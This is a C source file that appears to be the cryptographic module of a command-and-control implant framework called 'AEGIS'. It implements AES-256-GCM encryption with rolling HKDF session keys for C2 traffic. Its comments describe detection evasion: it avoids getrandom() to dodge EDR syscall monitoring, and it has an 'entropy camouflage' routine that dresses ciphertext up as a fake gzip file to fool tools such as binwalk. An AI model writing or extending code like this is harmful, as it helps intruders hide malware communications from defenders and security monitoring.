/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Cryptographic Engine (Implementation)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : c2_comms/crypto.c
 *  Purpose        : Full implementation of AES-256-GCM encryption, HKDF-SHA256
 *                   key derivation, rolling session keys, entropy camouflage,
 *                   and cryptographic utilities.
 *
 *  Dependencies   : OpenSSL libcrypto (EVP interface).
 *                   Link with: -lcrypto
 * ============================================================================
 */

#include "crypto.h"
#include "../common/logging.h"

#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/kdf.h>
#include <openssl/rand.h>


#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


/* ── Base64 Decode Table ─────────────────────────────────────────────────── */

static const uint8_t b64_table[256] = {
    ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,  ['E'] = 4,  ['F'] = 5,
    ['G'] = 6,  ['H'] = 7,  ['I'] = 8,  ['J'] = 9,  ['K'] = 10, ['L'] = 11,
    ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15, ['Q'] = 16, ['R'] = 17,
    ['S'] = 18, ['T'] = 19, ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
    ['Y'] = 24, ['Z'] = 25, ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29,
    ['e'] = 30, ['f'] = 31, ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35,
    ['k'] = 36, ['l'] = 37, ['m'] = 38, ['n'] = 39, ['o'] = 40, ['p'] = 41,
    ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45, ['u'] = 46, ['v'] = 47,
    ['w'] = 48, ['x'] = 49, ['y'] = 50, ['z'] = 51, ['0'] = 52, ['1'] = 53,
    ['2'] = 54, ['3'] = 55, ['4'] = 56, ['5'] = 57, ['6'] = 58, ['7'] = 59,
    ['8'] = 60, ['9'] = 61, ['+'] = 62, ['/'] = 63,
};

/* ── Utility Implementations ────────────────────────────────────────────── */

ssize_t aegis_base64_decode(const char *b64, uint8_t *out, size_t out_max) {
  if (!b64 || !out)
    return -1;

  size_t b64_len = strlen(b64);
  /* Strip padding for length calc */
  size_t pad = 0;
  if (b64_len >= 1 && b64[b64_len - 1] == '=')
    pad++;
  if (b64_len >= 2 && b64[b64_len - 2] == '=')
    pad++;

  size_t expected = (b64_len / 4) * 3 - pad;
  if (expected > out_max)
    return -1;

  size_t oi = 0;
  uint32_t accum = 0;
  int bits = 0;

  for (size_t i = 0; i < b64_len; i++) {
    if (b64[i] == '=' || b64[i] == '\n' || b64[i] == '\r')
      continue;
    accum = (accum << 6) | b64_table[(uint8_t)b64[i]];
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[oi++] = (uint8_t)(accum >> bits);
      accum &= (1 << bits) - 1;
    }
  }

  return (ssize_t)oi;
}

aegis_result_t aegis_random_bytes(uint8_t *buf, size_t len) {
  /*
   * Prefer /dev/urandom for stealth — getrandom() leaves a distinct
   * syscall signature that some EDR solutions monitor.
   */
  int fd = open("/dev/urandom", O_RDONLY);
  if (fd < 0) {
    /* Fallback: OpenSSL PRNG */
    if (RAND_bytes(buf, (int)len) != 1)
      return AEGIS_ERR_CRYPTO;
    return AEGIS_OK;
  }

  size_t total = 0;
  while (total < len) {
    ssize_t r = read(fd, buf + total, len - total);
    if (r <= 0) {
      close(fd);
      return AEGIS_ERR_CRYPTO;
    }
    total += (size_t)r;
  }
  close(fd);
  return AEGIS_OK;
}

int aegis_ct_compare(const void *a, const void *b, size_t len) {
  const volatile uint8_t *pa = (const volatile uint8_t *)a;
  const volatile uint8_t *pb = (const volatile uint8_t *)b;
  uint8_t diff = 0;
  for (size_t i = 0; i < len; i++)
    diff |= pa[i] ^ pb[i];
  return (int)diff;
}

/* ── HKDF-SHA256 ─────────────────────────────────────────────────────────── */

aegis_result_t aegis_hkdf_derive(const uint8_t *ikm, size_t ikm_len,
                                 const uint8_t *salt, size_t salt_len,
                                 const uint8_t *info, size_t info_len,
                                 uint8_t *okm, size_t okm_len) {
  EVP_PKEY_CTX *pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_HKDF, NULL);
  if (!pctx)
    return AEGIS_ERR_CRYPTO;

  aegis_result_t result = AEGIS_ERR_CRYPTO;

  if (EVP_PKEY_derive_init(pctx) <= 0)
    goto cleanup;
  if (EVP_PKEY_CTX_set_hkdf_md(pctx, EVP_sha256()) <= 0)
    goto cleanup;
  if (EVP_PKEY_CTX_set1_hkdf_salt(pctx, salt, (int)salt_len) <= 0)
    goto cleanup;
  if (EVP_PKEY_CTX_set1_hkdf_key(pctx, ikm, (int)ikm_len) <= 0)
    goto cleanup;
  if (EVP_PKEY_CTX_add1_hkdf_info(pctx, info, (int)info_len) <= 0)
    goto cleanup;

  if (EVP_PKEY_derive(pctx, okm, &okm_len) <= 0)
    goto cleanup;

  result = AEGIS_OK;

cleanup:
  EVP_PKEY_CTX_free(pctx);
  return result;
}

/* ── Initialization / Teardown ───────────────────────────────────────────── */

aegis_result_t aegis_crypto_init(aegis_crypto_ctx_t *ctx, const char *psk_b64) {
  if (!ctx)
    return AEGIS_ERR_CRYPTO;

  memset(ctx, 0, sizeof(*ctx));

  /* Decode the pre-shared key */
  const char *psk = psk_b64 ? psk_b64 : AEGIS_PSK_B64;
  uint8_t psk_raw[128];
  ssize_t psk_len = aegis_base64_decode(psk, psk_raw, sizeof(psk_raw));
  if (psk_len < 0)
    return AEGIS_ERR_CRYPTO;

  /* Generate a random salt for HKDF */
  aegis_result_t rc = aegis_random_bytes(ctx->hkdf_salt, AEGIS_HKDF_SALT_BYTES);
  if (rc != AEGIS_OK) {
    AEGIS_ZERO(psk_raw, sizeof(psk_raw));
    return rc;
  }

  /* Derive the master key from PSK */
  const char *info = AEGIS_HKDF_INFO;
  rc = aegis_hkdf_derive(psk_raw, (size_t)psk_len, ctx->hkdf_salt,
                         AEGIS_HKDF_SALT_BYTES, (const uint8_t *)info,
                         strlen(info), ctx->master_key, AEGIS_AES_KEY_BYTES);
  AEGIS_ZERO(psk_raw, sizeof(psk_raw));
  if (rc != AEGIS_OK)
    return rc;

  /* Derive the initial session key from the master key */
  uint8_t session_info[] = "aegis-session-key-v1-init";
  rc = aegis_hkdf_derive(ctx->master_key, AEGIS_AES_KEY_BYTES, ctx->hkdf_salt,
                         AEGIS_HKDF_SALT_BYTES, session_info,
                         sizeof(session_info) - 1, ctx->session_key,
                         AEGIS_AES_KEY_BYTES);
  if (rc != AEGIS_OK)
    return rc;

  ctx->msg_counter = 0;
  ctx->total_messages = 0;
  ctx->rekey_threshold = AEGIS_SESSION_KEY_ROTATE_N;

  return AEGIS_OK;
}

void aegis_crypto_destroy(aegis_crypto_ctx_t *ctx) {
  if (!ctx)
    return;
  /* Multi-pass wipe of all key material */
  AEGIS_WIPE(ctx->master_key, AEGIS_AES_KEY_BYTES, 3);
  AEGIS_WIPE(ctx->session_key, AEGIS_AES_KEY_BYTES, 3);
  AEGIS_WIPE(ctx->hkdf_salt, AEGIS_HKDF_SALT_BYTES, 3);
  ctx->msg_counter = 0;
  ctx->total_messages = 0;
}

/* ── Session Key Rotation ────────────────────────────────────────────────── */

aegis_result_t aegis_rekey(aegis_crypto_ctx_t *ctx) {
  if (!ctx)
    return AEGIS_ERR_CRYPTO;

  /*
   * Rolling key derivation: new_key = HKDF(current_session_key || master_key).
   * This provides forward secrecy — compromise of one session key does not
   * reveal any previous or future session keys.
   */
  uint8_t combined[AEGIS_AES_KEY_BYTES * 2];
  memcpy(combined, ctx->session_key, AEGIS_AES_KEY_BYTES);
  memcpy(combined + AEGIS_AES_KEY_BYTES, ctx->master_key, AEGIS_AES_KEY_BYTES);

  /* Generate fresh salt for the new derivation */
  uint8_t new_salt[AEGIS_HKDF_SALT_BYTES];
  aegis_result_t rc = aegis_random_bytes(new_salt, AEGIS_HKDF_SALT_BYTES);
  if (rc != AEGIS_OK) {
    AEGIS_ZERO(combined, sizeof(combined));
    return rc;
  }

  uint8_t new_key[AEGIS_AES_KEY_BYTES];
  uint8_t rekey_info[] = "aegis-session-rekey";
  rc = aegis_hkdf_derive(combined, sizeof(combined), new_salt, sizeof(new_salt),
                         rekey_info, sizeof(rekey_info) - 1, new_key,
                         AEGIS_AES_KEY_BYTES);

  AEGIS_ZERO(combined, sizeof(combined));
  if (rc != AEGIS_OK)
    return rc;

  /* Wipe old session key, install new one */
  AEGIS_WIPE(ctx->session_key, AEGIS_AES_KEY_BYTES, 1);
  memcpy(ctx->session_key, new_key, AEGIS_AES_KEY_BYTES);
  memcpy(ctx->hkdf_salt, new_salt, AEGIS_HKDF_SALT_BYTES);
  AEGIS_ZERO(new_key, sizeof(new_key));

  ctx->msg_counter = 0; /* Reset counter */

  return AEGIS_OK;
}

/* ── Internal: Auto-rekey check ──────────────────────────────────────────── */

static aegis_result_t maybe_rekey(aegis_crypto_ctx_t *ctx) {
  ctx->msg_counter++;
  ctx->total_messages++;

  if (ctx->msg_counter >= ctx->rekey_threshold) {
    return aegis_rekey(ctx);
  }
  return AEGIS_OK;
}

/* ── Internal: Generate deterministic-looking IV ─────────────────────────── */

static aegis_result_t generate_iv(aegis_crypto_ctx_t *ctx,
                                  uint8_t iv[AEGIS_GCM_IV_BYTES]) {
  /*
   * IV construction: first 4 bytes = truncated HMAC of counter,
   * last 8 bytes = random.  This prevents IV reuse even across
   * rekeying boundaries while maintaining unpredictability.
   */
  uint8_t random_part[8];
  aegis_result_t rc = aegis_random_bytes(random_part, 8);
  if (rc != AEGIS_OK)
    return rc;

  /* Counter-derived prefix */
  uint64_t ctr = ctx->total_messages;
  iv[0] = (uint8_t)(ctr >> 24);
  iv[1] = (uint8_t)(ctr >> 16);
  iv[2] = (uint8_t)(ctr >> 8);
  iv[3] = (uint8_t)(ctr);

  memcpy(iv + 4, random_part, 8);
  return AEGIS_OK;
}

/* ── Encryption ──────────────────────────────────────────────────────────── */

aegis_result_t aegis_encrypt(aegis_crypto_ctx_t *ctx, const uint8_t *plaintext,
                             size_t pt_len, const uint8_t *aad, size_t aad_len,
                             uint8_t *ciphertext,
                             uint8_t iv_out[AEGIS_GCM_IV_BYTES],
                             uint8_t tag_out[AEGIS_GCM_TAG_BYTES]) {
  if (!ctx || !plaintext || !ciphertext || !iv_out || !tag_out)
    return AEGIS_ERR_CRYPTO;

  /* Generate IV */
  aegis_result_t rc = generate_iv(ctx, iv_out);
  if (rc != AEGIS_OK)
    return rc;

  /* Set up the EVP cipher context */
  EVP_CIPHER_CTX *evp = EVP_CIPHER_CTX_new();
  if (!evp)
    return AEGIS_ERR_CRYPTO;

  aegis_result_t result = AEGIS_ERR_CRYPTO;
  int outlen = 0;

  if (EVP_EncryptInit_ex(evp, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1)
    goto cleanup;

  /* Set IV length explicitly */
  if (EVP_CIPHER_CTX_ctrl(evp, EVP_CTRL_GCM_SET_IVLEN, AEGIS_GCM_IV_BYTES,
                          NULL) != 1)
    goto cleanup;

  /* Set key and IV */
  if (EVP_EncryptInit_ex(evp, NULL, NULL, ctx->session_key, iv_out) != 1)
    goto cleanup;

  /* Process AAD if provided */
  if (aad && aad_len > 0) {
    if (EVP_EncryptUpdate(evp, NULL, &outlen, aad, (int)aad_len) != 1)
      goto cleanup;
  }

  /* Encrypt the plaintext */
  if (EVP_EncryptUpdate(evp, ciphertext, &outlen, plaintext, (int)pt_len) != 1)
    goto cleanup;

  /* Finalize (for GCM, this produces no additional output) */
  int final_len = 0;
  if (EVP_EncryptFinal_ex(evp, ciphertext + outlen, &final_len) != 1)
    goto cleanup;

  /* Extract the authentication tag */
  if (EVP_CIPHER_CTX_ctrl(evp, EVP_CTRL_GCM_GET_TAG, AEGIS_GCM_TAG_BYTES,
                          tag_out) != 1)
    goto cleanup;

  result = AEGIS_OK;

  /* Auto-rekey if threshold reached */
  maybe_rekey(ctx);

cleanup:
  EVP_CIPHER_CTX_free(evp);
  return result;
}

/* ── Decryption ──────────────────────────────────────────────────────────── */

aegis_result_t aegis_decrypt(aegis_crypto_ctx_t *ctx, const uint8_t *ciphertext,
                             size_t ct_len, const uint8_t *aad, size_t aad_len,
                             const uint8_t iv[AEGIS_GCM_IV_BYTES],
                             const uint8_t tag[AEGIS_GCM_TAG_BYTES],
                             uint8_t *plaintext) {
  if (!ctx || !ciphertext || !iv || !tag || !plaintext)
    return AEGIS_ERR_CRYPTO;

  EVP_CIPHER_CTX *evp = EVP_CIPHER_CTX_new();
  if (!evp)
    return AEGIS_ERR_CRYPTO;

  aegis_result_t result = AEGIS_ERR_CRYPTO;
  int outlen = 0;

  if (EVP_DecryptInit_ex(evp, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1)
    goto cleanup;

  if (EVP_CIPHER_CTX_ctrl(evp, EVP_CTRL_GCM_SET_IVLEN, AEGIS_GCM_IV_BYTES,
                          NULL) != 1)
    goto cleanup;

  if (EVP_DecryptInit_ex(evp, NULL, NULL, ctx->session_key, iv) != 1)
    goto cleanup;

  /* Process AAD */
  if (aad && aad_len > 0) {
    if (EVP_DecryptUpdate(evp, NULL, &outlen, aad, (int)aad_len) != 1)
      goto cleanup;
  }

  /* Decrypt */
  if (EVP_DecryptUpdate(evp, plaintext, &outlen, ciphertext, (int)ct_len) != 1)
    goto cleanup;

  /* Set the expected tag before finalization */
  if (EVP_CIPHER_CTX_ctrl(evp, EVP_CTRL_GCM_SET_TAG, AEGIS_GCM_TAG_BYTES,
                          (void *)tag) != 1)
    goto cleanup;

  /* Finalize — this verifies the authentication tag */
  int final_len = 0;
  if (EVP_DecryptFinal_ex(evp, plaintext + outlen, &final_len) != 1) {
    /* Tag verification failed — data integrity compromised */
    AEGIS_ZERO(plaintext, ct_len);
    result = AEGIS_ERR_AUTH;
    goto cleanup;
  }

  result = AEGIS_OK;

cleanup:
  EVP_CIPHER_CTX_free(evp);
  return result;
}

/* ── Entropy Camouflage ──────────────────────────────────────────────────── */

/*
 * Wraps encrypted data in a fake gzip envelope.  The resulting blob:
 *   - Starts with the gzip magic bytes (1f 8b 08 ...)
 *   - Contains a synthetic gzip header
 *   - Holds the encrypted payload as the "compressed data"
 *   - Ends with a fake CRC32 and size footer
 *
 * This fools entropy analysis tools (binwalk, file, etc.) into
 * classifying the blob as a compressed file rather than flagging
 * the high-entropy content as suspicious.
 */

aegis_result_t aegis_entropy_camouflage_wrap(const uint8_t *data,
                                             size_t data_len, uint8_t *wrapped,
                                             size_t *wrapped_len) {
  if (!data || !wrapped || !wrapped_len)
    return AEGIS_ERR_CRYPTO;

  /*
   * Gzip header  : 10 bytes
   * Payload      : data_len bytes
   * CRC32 + size : 8 bytes
   * Total        : data_len + 18
   */
  size_t total = data_len + 18;
  *wrapped_len = total;

  /* Gzip header */
  wrapped[0] = 0x1F; /* Magic 1 */
  wrapped[1] = 0x8B; /* Magic 2 */
  wrapped[2] = 0x08; /* Compression method: deflate */
  wrapped[3] = 0x00; /* Flags: none */
  /* Timestamp: use a plausible epoch value */
  wrapped[4] = 0x83;
  wrapped[5] = 0x92;
  wrapped[6] = 0x6A;
  wrapped[7] = 0x65;
  wrapped[8] = 0x02; /* Extra flags: max compression */
  wrapped[9] = 0x03; /* OS: Unix */

  /* Copy the encrypted payload as "compressed data" */
  memcpy(wrapped + 10, data, data_len);

  /* Fake CRC32 (just hash the data for consistency) */
  uint32_t fake_crc = 0;
  for (size_t i = 0; i < data_len; i++) {
    fake_crc ^= data[i];
    for (int b = 0; b < 8; b++) {
      if (fake_crc & 1)
        fake_crc = (fake_crc >> 1) ^ 0xEDB88320;
      else
        fake_crc >>= 1;
    }
  }

  /* CRC32 (little-endian) */
  wrapped[10 + data_len + 0] = (uint8_t)(fake_crc);
  wrapped[10 + data_len + 1] = (uint8_t)(fake_crc >> 8);
  wrapped[10 + data_len + 2] = (uint8_t)(fake_crc >> 16);
  wrapped[10 + data_len + 3] = (uint8_t)(fake_crc >> 24);

  /* Original size (little-endian, mod 2^32) */
  uint32_t orig_size = (uint32_t)(data_len & 0xFFFFFFFF);
  wrapped[10 + data_len + 4] = (uint8_t)(orig_size);
  wrapped[10 + data_len + 5] = (uint8_t)(orig_size >> 8);
  wrapped[10 + data_len + 6] = (uint8_t)(orig_size >> 16);
  wrapped[10 + data_len + 7] = (uint8_t)(orig_size >> 24);

  return AEGIS_OK;
}

aegis_result_t aegis_entropy_camouflage_unwrap(const uint8_t *wrapped,
                                               size_t wrapped_len,
                                               uint8_t *data,
                                               size_t *data_len) {
  if (!wrapped || !data || !data_len)
    return AEGIS_ERR_CRYPTO;

  /* Verify gzip magic */
  if (wrapped_len < 18 || wrapped[0] != 0x1F || wrapped[1] != 0x8B)
    return AEGIS_ERR_CRYPTO;

  /* Extract payload (skip 10-byte header, strip 8-byte footer) */
  size_t payload_len = wrapped_len - 18;
  memcpy(data, wrapped + 10, payload_len);
  *data_len = payload_len;

  return AEGIS_OK;
}
